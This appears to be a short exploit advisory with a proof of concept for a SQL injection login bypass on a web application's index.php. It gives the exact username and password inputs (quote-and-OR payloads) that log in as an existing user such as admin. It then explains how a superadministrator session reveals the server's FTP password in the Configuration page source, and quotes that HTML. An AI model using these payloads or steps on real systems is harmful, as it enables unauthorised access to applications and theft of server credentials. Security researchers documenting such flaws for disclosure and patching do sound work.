Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
POC:
====
First go to http://www.site.com/oi/index.php
In this login page provide the following inputs:
Username : username' OR '
Password : ' OR '
Note : here username should be a valid user registered on the site (generally admin)
Also, if a 'superadministrator'login is found and sucessfully exploited the server's
ftp password can be found by clicking 'Configuration' and viewing the pages source:
(It's hidden by \*)
<TD CLASS="dialogue\_heading">Password</TD>
<TD><input type="password" name="ftpPassword" value="password"></TD>
